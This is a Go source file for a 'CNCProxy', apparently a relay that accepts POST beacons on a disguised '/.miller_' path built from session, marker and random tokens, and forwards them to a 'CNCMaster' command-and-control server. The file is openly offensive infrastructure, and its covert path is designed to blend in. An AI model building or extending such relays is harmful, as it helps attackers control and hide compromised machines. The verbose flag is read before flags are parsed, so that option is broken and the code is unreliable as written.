package main

import (
    "github.com/gorilla/mux"

    "flag"
    "log"
    "net/http"
)


var mgr manager
var verbose bool

const default_listen_tpl = "127.0.0.1:8080"
const default_master_tpl = "127.0.0.1:8081"
const default_verbose = false


func main() {
    listen_tpl := flag.String("listen", default_listen_tpl,
                              "CNCProxy listen address.")
    master_tpl := flag.String("master", default_master_tpl,
                              "CNCMaster connect address.")
    verbose = *flag.Bool("verbose", default_verbose,
                         "CNCProxy verbose mode")
    flag.Parse()

    mgr = NewManager()
    rtr := mux.NewRouter()
    /* /.miller_pahhj0099wjtu87vdgtl8fq8k4zmh0is_sbmkuj97_rg38n6bop9m5htrbeyyx0ljx26gbjxdx5nztp4a1wfowdsyyqnzts0r440logk91 */
    rtr.HandleFunc("/.miller_{sid:[a-zA-Z0-9]{32}}_{marker:[a-zA-Z0-9]{8}}_{rnd:[a-zA-Z0-9]{64}}", miller_http_handler).Methods("POST")

    http.Handle("/", rtr)

    log.Println("CNCProxy: Listening on " + *listen_tpl + "...")
    log.Println("CNCProxy: Forwarding to CNCMaster at " + *master_tpl)
    log.Fatal(http.ListenAndServe(*listen_tpl, logRequest(http.DefaultServeMux)))
}

func logRequest(handler http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if verbose {
            log.Printf("%s %s %s\n", r.RemoteAddr, r.Method, r.URL)
        }
        handler.ServeHTTP(w, r)
    })
}
